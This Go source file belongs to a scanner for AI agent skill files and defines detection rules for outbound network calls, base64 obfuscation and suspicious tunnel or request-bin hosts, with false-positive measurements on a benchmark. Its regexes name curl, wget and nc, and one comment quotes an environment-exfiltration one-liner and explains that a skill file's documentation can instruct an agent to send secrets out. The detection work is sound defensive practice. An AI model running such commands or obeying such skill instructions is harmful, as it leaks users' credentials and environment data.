package rules

import (
	"bytes"
	"net"
	"net/url"
	"regexp"
	"strings"

	"github.com/velzepooz/skill-detector/pkg/axes"
	"github.com/velzepooz/skill-detector/pkg/model"
)

// SD-007: Outbound network call patterns.
var (
	// `fetch` is only a network command when it is a call. Bare `fetch\s+`
	// matched the English verb — "a script to fetch live data", "not visible
	// to fetch" — which produced 59 findings on benign skills and 103 on
	// malicious ones, i.e. noise on both sides of the label. The JS
	// `fetch(...)` form is covered by reRequestsLib.
	reNetworkCommand = regexp.MustCompile(`\b(curl|wget|ncat|nc)\s+|\bfetch\s+(-|https?://)`)
	reHTTPURL        = regexp.MustCompile(`https?://[^\s"')\]>]+`)
	reRequestsLib    = regexp.MustCompile(`\b(requests\.(get|post|put|delete|patch)|urllib\.request|fetch\()`)
	reGitFetch       = regexp.MustCompile(`\bgit\s+fetch\b`)
)

// SD-008: Base64 obfuscation patterns.
var (
	reBase64Command = regexp.MustCompile(`\bbase64\s+(-d|--decode)`)
	reBase64Inline  = regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)
	reBase64Decode  = regexp.MustCompile(`\b(atob|b64decode|Base64\.decode|base64\.b64decode)\s*\(`)
	reHashLine      = regexp.MustCompile(`(?i)(sha(256|512|1)?|md5|checksum|hash)\s*[:=]`)

	// A long run of base64 characters is not evidence of a payload. Measured
	// on MalSkillBench, the inline branch produced 402 findings on benign
	// skills and 171 on malicious ones, and both sides were mostly these:
	//
	//   reSRIHash  — npm/yarn lockfile integrity values. 322 benign hits,
	//                zero malicious ones.
	//   reHexBlob  — a blockchain address or key written as hex.
	//   path-like  — `/` is in the base64 alphabet, so any deep path matched:
	//                `~/.claude/skills/CORE/USER/SKILLCUSTOMIZATIONS/Art/`.
	//   low entropy — a single-case run carries no encoded payload.
	//
	// Damping these keeps 69 of the malicious hits and 3 of the benign ones.
	reSRIHash = regexp.MustCompile(`(?i)"integrity"\s*:|\bsha(1|256|384|512)-`)
	reHexBlob = regexp.MustCompile(`\b0x[0-9a-fA-F]{20,}`)
)

// tunnelOrPasteHosts are hosts that exist to be temporary: request bins,
// ephemeral tunnels and free subdomain hosts. A published API lives on a
// stable domain; a collection endpoint frequently does not.
var tunnelOrPasteHosts = regexp.MustCompile(`(?i)(^|\.)(ngrok-free\.app|ngrok\.io|trycloudflare\.com|pythonanywhere\.com|webhook\.site|pipedream\.net|requestbin\.[a-z]+|burpcollaborator\.net|serveo\.net|localtunnel\.me|oastify\.com|interact\.sh)$`)

// suspiciousEndpoint reports whether a URL's host is one a published service
// would not use: a bare IP address, a non-standard port, or an ephemeral
// tunnel/request-bin host.
//
// This is the only signal that separates the two populations at scale. On
// MalSkillBench, an IP literal appears in 14.8% of malicious SD-007 hits and
// 3.4% of benign ones; by contrast a `$(...)` substitution in the same
// statement carries almost no signal (10.3% vs 8.0%), and an environment
// variable is *more* common in benign skills (24.5% vs 3.3%) because that is
// how an API token reaches an Authorization header.
func suspiciousEndpoint(raw string) bool {
	raw = strings.Trim(raw, `"'`+"`"+`,;)`)
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return false
	}
	host := u.Hostname()
	if net.ParseIP(host) != nil {
		return true
	}
	if p := u.Port(); p != "" && p != "80" && p != "443" {
		return true
	}
	return tunnelOrPasteHosts.MatchString(host)
}

// reLocalDataSubst matches a command substitution that reads local state:
// `$(env)`, `$(cat ~/.aws/credentials)`, backticked `ps auxeww`. Coverage is
// small — 1.6% of malicious SD-007 hits against 0.2% of benign — but it is
// the shape of the canonical exfiltration one-liner, and in an agent manifest
// the documentation *is* the program: a SKILL.md that says
// `curl -d "$(env)" https://collector...` is not describing an endpoint, it
// is instructing the agent to send the environment.
var (
	reCmdSubst  = regexp.MustCompile("\\$\\(|`")
	reLocalRead = regexp.MustCompile(`\b(env|printenv|cat|ps|whoami|hostname|uname|id|base64|tar|zip|gpg|security|find)\b`)
	reDataFlag  = regexp.MustCompile(`(^|\s)(-d|--data|--data-binary|--data-raw|--form|-F)(\s|=)`)
)

// exfiltratesLocalData reports whether the statement pipes local state into
// the request rather than sending literal or user-supplied content.
func exfiltratesLocalData(stmt string) bool {
	if !reCmdSubst.MatchString(stmt) {
		return false
	}
	return reLocalRead.MatchString(stmt) || reDataFlag.MatchString(stmt)
}

// shellStatement joins line i with its backslash continuations, so a request
// split across lines is judged as one command. Bounded: a runaway file of
// trailing backslashes must not turn one finding into a whole-file read.
func shellStatement(lines [][]byte, i int) string {
	const maxJoin = 8
	var b strings.Builder
	for n := 0; i < len(lines) && n < maxJoin; n++ {
		b.Write(lines[i])
		if !bytes.HasSuffix(bytes.TrimRight(lines[i], "\r"), []byte("\\")) {
			break
		}
		b.WriteByte('\n')
		i++
	}
	return b.String()
}

type networkCallRule struct {
	baseRule
}

// endpointFinding emits an SD-007 finding, choosing between the two things
// this pattern can mean.
//
// In a documentation file, `curl https://api.notion.com/v1/pages` is a Notion
// skill telling the reader which endpoint it uses. That is a disclosure, not
// a vulnerability, and rating it High on the security axis caps an honest
// skill at D — measured as 74 of 137 false positives on a benign corpus. The
// same line inside a script is not a declaration: it runs. And any host that
// a published API would not use stays High wherever it appears.
func (r *networkCallRule) endpointFinding(ctx model.FileContext, line int, url, stmt string, declared bool, desc string) model.Finding {
	if declared && url != "" && !suspiciousEndpoint(url) && !exfiltratesLocalData(stmt) {
		return r.newFindingAs(ctx, line, model.SeverityMedium, axes.Transparency,
			"documented endpoint "+url,
			"Confirm the skill's documentation matches what it actually contacts")
	}
	return r.newFinding(ctx, line, desc,
		"Remove or restrict outbound network calls; document why external access is needed")
}

func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.Finding {
	if !IsAgentFile(ctx.Path) && !isInAgentConfigDir(ctx.Path) {
		return nil
	}
	declared := isDocFile(ctx.Path) || isDeclarativeFile(ctx.Path)
	var findings []model.Finding
	lines := bytes.Split(content, []byte("\n"))
	for i, line := range lines {
		lineNum := i + 1
		// The URL frequently sits on a backslash continuation of the same
		// command, so read it from the whole statement, not the first line.
		stmt := shellStatement(lines, i)
		urlMatch := reHTTPURL.FindString(stmt)
		if reNetworkCommand.Match(line) && !reGitFetch.Match(line) {
			desc := "outbound network call detected"
			if urlMatch != "" {
				desc = "outbound network call to " + urlMatch
			}
			findings = append(findings, r.endpointFinding(ctx, lineNum, urlMatch, stmt, declared, desc))
			continue
		}
		if reRequestsLib.Match(line) {
			desc := "outbound network call via library"
			if urlMatch != "" {
				desc = "outbound network call via library to " + urlMatch
			}
			findings = append(findings, r.endpointFinding(ctx, lineNum, urlMatch, stmt, declared, desc))
			continue
		}
		// A bare URL with no call around it. In prose it is a link and says
		// nothing about behaviour, so it stays silent. In structured data it
		// is a declared endpoint: worth surfacing on transparency, never a
		// security defect on its own.
		if urlMatch == "" {
			continue
		}
		switch {
		case isDocFile(ctx.Path):
			// silent
		case isDeclarativeFile(ctx.Path) && !suspiciousEndpoint(urlMatch):
			findings = append(findings, r.newFindingAs(ctx, lineNum,
				model.SeverityMedium, axes.Transparency,
				"declared endpoint "+urlMatch,
				"Confirm the skill's configuration matches what it actually contacts"))
		default:
			findings = append(findings, r.newFinding(ctx, lineNum,
				"outbound network reference to "+urlMatch,
				"Remove or restrict outbound network references; document why external access is needed"))
		}
	}
	return findings
}

type base64ObfuscationRule struct {
	baseRule
}

func (r *base64ObfuscationRule) Match(content []byte, ctx model.FileContext) []model.Finding {
	if !IsAgentFile(ctx.Path) && !isInAgentConfigDir(ctx.Path) {
		return nil
	}
	var findings []model.Finding
	lines := bytes.Split(content, []byte("\n"))
	for i, line := range lines {
		lineNum := i + 1
		if reBase64Command.Match(line) {
			findings = append(findings, r.newFinding(ctx, lineNum,
				"base64 decode command detected — potential obfuscation",
				"Avoid using base64 to decode data at runtime; use plaintext configuration instead"))
			continue
		}
		if reBase64Decode.Match(line) {
			findings = append(findings, r.newFinding(ctx, lineNum,
				"base64 decode function call detected — potential obfuscation",
				"Avoid using base64 to decode data at runtime; use plaintext configuration instead"))
			continue
		}
		// Inline base64 string — skip if the match is inside a URL, the line is
		// a hash, or the token is one of the shapes that share base64's
		// alphabet without carrying a payload.
		if b64Loc := reBase64Inline.FindIndex(line); b64Loc != nil && !reHashLine.Match(line) &&
			!reSRIHash.Match(line) && !reHexBlob.Match(line) && isEncodedPayload(line[b64Loc[0]:b64Loc[1]]) {
			inURL := false
			for _, urlLoc := range reHTTPURL.FindAllIndex(line, -1) {
				if b64Loc[0] >= urlLoc[0] && b64Loc[1] <= urlLoc[1] {
					inURL = true
					break
				}
			}
			if !inURL {
				findings = append(findings, r.newFinding(ctx, lineNum,
					"long base64-encoded string detected — potential obfuscation",
					"Avoid embedding base64-encoded data; use plaintext or reference external config"))
			}
		}
	}
	return findings
}

// isEncodedPayload reports whether a run of base64 characters plausibly
// encodes something, as opposed to being a filesystem path or a single-case
// identifier that happens to use the same alphabet.
func isEncodedPayload(tok []byte) bool {
	if bytes.ContainsRune(tok, '/') && !bytes.ContainsAny(tok, "+=") {
		return false // a path: separators, but none of base64's padding
	}
	var lower, upper, digit bool
	for _, c := range tok {
		switch {
		case c >= 'a' && c <= 'z':
			lower = true
		case c >= 'A' && c <= 'Z':
			upper = true
		case c >= '0' && c <= '9', c == '+', c == '/':
			digit = true
		}
	}
	return lower && upper && digit
}

// isDocFile reports whether the path looks like a documentation file
// where a bare URL reference is expected noise, not an executable call.
func isDocFile(path string) bool {
	p := strings.ToLower(path)
	return strings.HasSuffix(p, ".md") ||
		strings.HasSuffix(p, ".txt") ||
		strings.HasSuffix(p, ".rst")
}

// isDeclarativeFile reports whether the path is structured data rather than
// code or prose: a manifest, a lockfile, a compose file. A URL there is a
// declaration — a registry the package came from, a service a config points
// at — and never a call this file makes.
//
// Measured: on MalSkillBench these files carry 146 SD-007 hits on benign
// skills (npm lockfile registry URLs, mostly) against 2 on malicious ones.
// The agent-config members of this family have dedicated rules already —
// SD-021 for MCP endpoints, SD-017/SD-019 for settings.json — so SD-007's
// contribution here is noise on top of coverage that exists elsewhere.
func isDeclarativeFile(path string) bool {
	p := strings.ToLower(path)
	for _, ext := range []string{".json", ".yaml", ".yml", ".toml", ".lock", ".xml"} {
		if strings.HasSuffix(p, ext) {
			return true
		}
	}
	return false
}

// RegisterExfiltrationRules registers all exfiltration detection rules.
func RegisterExfiltrationRules(registry *RuleRegistry) {
	registry.Register(&networkCallRule{
		baseRule: baseRule{
			id:       "SD-007",
			name:     "Outbound Network Call",
			severity: model.SeverityHigh,
			category: "SSRF / Data Exfiltration",
			types:    ContentScanTypes,
			axis:     axes.Security,
		},
	})
	registry.Register(&base64ObfuscationRule{
		baseRule: baseRule{
			id:       "SD-008",
			name:     "Base64 Obfuscation",
			severity: model.SeverityMedium,
			category: "SSRF / Data Exfiltration",
			types:    ContentScanTypes,
			axis:     axes.Security,
		},
	})
	registry.Register(&dnsExfilRule{
		baseRule: baseRule{
			id:       "SD-022",
			name:     "DNS Exfiltration",
			severity: model.SeverityHigh,
			category: "SSRF / Data Exfiltration",
			types:    ContentScanTypes,
			axis:     axes.Security,
		},
	})
}
